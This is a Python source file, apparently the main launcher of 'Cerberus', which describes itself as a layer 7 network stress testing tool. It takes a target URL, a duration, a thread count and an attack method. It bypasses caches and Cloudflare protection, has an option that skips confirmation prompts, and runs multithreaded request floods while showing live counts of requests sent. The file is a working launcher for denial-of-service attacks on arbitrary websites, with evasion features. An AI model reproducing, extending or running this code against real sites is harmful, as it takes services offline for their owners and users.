'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

# import all non-stdlib modules, just to check if they are actually installed
try:
    import requests # for sending the actual requests
    from colorama import Fore, init # fancy colors :O
    import cloudscraper, selenium, undetected_chromedriver # cloudflare bypass
    import argparse # needed for command line argument parsing
    import tabulate # pretty tables
except Exception as e:
    print(' - Error, it looks like i\'m missing some modules. Did you try "pip install -r requirements"?')
    print(f' - Stacktrace: \n{str(e).rstrip()}')
    exit()

# import the standard library modules, should have no problems importing them
try:
    import sys # checking the python version
    import urllib # url parsing
    import threading # threaded attacks
    import json # parsing json, and creating json objects
    import time # delay between attacks
    import random # picking random stuff
    import netaddr # stuff with ip addresses
    import sqlite3 # database
    import textwrap # for the argparser module
    from http.client import HTTPConnection # setting the "HTTP/" value
except Exception as e:
    print(' - Error, failed to import standard library module.')
    print(f' - Stacktrace: \n{str(e).rstrip()}')
    exit()

if sys.version_info[0] < 3 and sys.version_info[1] < 6:
    sys.exit(' - Error, please run Cerberus with Python 3.6 or higher.') # now that we've import sys, we can exit and print with a single function, awesome!

# import all custom modules from the "src" directory
try:
    from src.utils import * # import all utilities
    from src.core import * # import the "bridge", basically used to store variables editable by all core modules
    from src.database import * # database stuff
    from src.argparser import *
    from src.methods import *
except Exception as e:
    print(' - Error, failed to import core modules.')
    sys.exit(f' - Stacktrace: \n{str(e).rstrip()}')

# initialize colorama
init(autoreset=True) # makes it so i don't need to do Fore.RESET at the end of every print()

utils().print_banner()
if len(sys.argv) <= 1: # no arguments? just show all logs

    if len(database().get_logs()) == 0:
        print('\n - No running attacks.')

    else:
        print('\n' + utils().table(
            [(row['timestamp'], row['identifier'], row['target'], row['attack_vector'], row['bypass_cache']) for row in database().get_logs()], 
            ['Timestamp', 'ID', 'Target', 'Method', 'Bypass cache?']
        ))

    print(f'\n\n + To view the commands, try this: python3 {sys.argv[0]} -h')
    print('\n + Tip: you can easily re-launch an attack by using the ID like this:')
    print(f'python3 {sys.argv[0]} --launch-from-id <attack id here>\n')

else: # parse the arguments with argparse

    parser = ArgumentParser(width=100, description='''Cerberus is a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
It's written in Python3 and is usable on all systems with Python installed.''',
                            epilog='''Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
''', argument_default=argparse.SUPPRESS, allow_abbrev=False)

    # add arguments
    parser.add_argument('-t',       '--target-url',      action='store',      dest='target_url',      metavar="target url",  type=str,    help="Target url to attack", default=None)
    parser.add_argument('-d',       '--attack-duration', action='store',      dest='duration',        metavar='duration',    type=int,    help='Attack length in seconds', default=100)
    parser.add_argument('-w',       '--workers',         action='store',      dest='workers',         metavar='workers',     type=int,    help='Number of threads/workers to spawn', default=40)
    parser.add_argument('-m',       '--method',          action='store',      dest='method',          metavar='method',      type=str,    help='Attack method/vector to use', default='GET')
    parser.add_argument('-logs',    '--list-logs',       action='store_true', dest='list_logs',                                           help='List all attack logs', default=False)
    parser.add_argument('-methods', '--list-methods',    action='store_true', dest='list_methods',                                        help='List all the attack methods', default=False)
    parser.add_argument('-bc',      '--bypass-cache',    action='store_true', dest='bypass_cache',                                        help='Try to bypass any caching systems to ensure we hit the main servers', default=False)
    parser.add_argument('-y',       '--yes-to-all',      action='store_true', dest='yes_to_all',                                          help='Skip any user prompts, and just launch the attack', default=False)
    parser.add_argument(            '--http-version',    action='store',      dest='http_ver',        metavar='http version', type=str,   help='Set the HTTP protocol version', default='1.1')
    args = vars(parser.parse_args()) # parse the arguments

    if args['list_logs']:

        if len(database().get_logs()) == 0:
            print('\n - No running attacks.')

        else:
            print('\n' + utils().table(
                [(row['timestamp'], row['identifier'], row['target'], row['attack_vector'], row['bypass_cache']) for row in database().get_logs()], 
                ['Timestamp', 'ID', 'Target', 'Method', 'Bypass cache?']
            ))

        print('\n\n + Tip: you can easily re-launch an attack by using the ID like this:')
        sys.exit(f' + python3 {sys.argv[0]} --launch-from-id <attack id here>\n')
    
    if args['list_methods']:
        print('\n')

        for method, items in Core.methods.items():
            print(f'{method}: {items["info"]}')

        sys.exit('\n')

    if not args['target_url']: # check if the "-t/--target-url" argument has been passed
        sys.exit('\n - Please specify your target.\n')

    attack_method = args['method'].upper()
    if not Core.methods.get(attack_method): # if the method does not exist
        sys.exit(f'\n - Error, method "{attack_method}" does not exist.\n')
    
    Core.bypass_cache = args['bypass_cache']
    
    print(' + Current attack configuration:')
    print(f'   - Target: {args["target_url"]}')
    print(f'   - Duration: {utils().Sec2Str(args["duration"])}')
    print(f'   - Workers: {str(args["workers"])}')
    print(f'   - Method/Vector: {args["method"]}')
    print(f'   - Cache bypass? {str(Core.bypass_cache)}')

    if not input('\n + Correct? (Y/n) ').lower().startswith('y'):
        sys.exit('\n')

    print('\n + Creating unique identifier for attack')
    attack_id = utils().make_id()
    Core.infodict[attack_id] = {'req_sent': 0, 'req_fail': 0, 'req_total': 0}

    # before we create the session, we need to set the HTTP protocol version
    HTTPConnection._http_vsn_str = f'HTTP/{args["http_ver"]}'

    print(' + Creating requests session.')
    session = utils().buildsession()
    Core.session = session

    if not args['yes_to_all']:
        input('\n + Ready? (Press ENTER) ')

    Core.bypass_cache = True

    print(' + Launching attack.')
    stoptime = stoptime = time.time() + args['duration']
    for _ in range(args["workers"]):
        threading.Thread(target=Core.methods.get(attack_method)['func'], args=(attack_id, args['target_url'], stoptime,)).start()

    while 1:
        try:
            utils().clear()

            sent = str(Core.infodict[attack_id]['req_sent'])
            failed = str(Core.infodict[attack_id]['req_fail'])
            total = str(Core.infodict[attack_id]['req_total'])

            print(f' + Target: {args["target_url"]}')
            print(f' + Sent: {sent}')
            print(f' + Failed: {failed}')
            print(f' + Total: {total}')

            time.sleep(2)

        except KeyboardInterrupt:
            Core.attackrunning = False
            break
    
    utils().clear()
    print(' + Attack finished.')